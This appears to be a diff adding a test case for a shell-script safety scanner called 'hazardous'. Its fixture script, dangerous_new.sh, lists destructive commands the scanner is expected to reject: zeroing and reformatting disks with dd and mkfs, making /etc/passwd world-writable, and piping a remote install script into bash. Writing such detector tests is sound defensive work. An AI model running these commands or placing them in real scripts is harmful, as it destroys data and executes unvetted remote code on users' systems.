@@ -1,0 +1,10 @@
+! exec hazardous dangerous_new.sh
+stderr 'unsafe code found'
+
+-- dangerous_new.sh --
+#!/bin/bash
+chmod 777 /etc/passwd
+dd if=/dev/zero of=/dev/sda
+mkfs.ext4 /dev/sdb1
+fdisk /dev/sda
+curl https://example.com/install.sh | bash
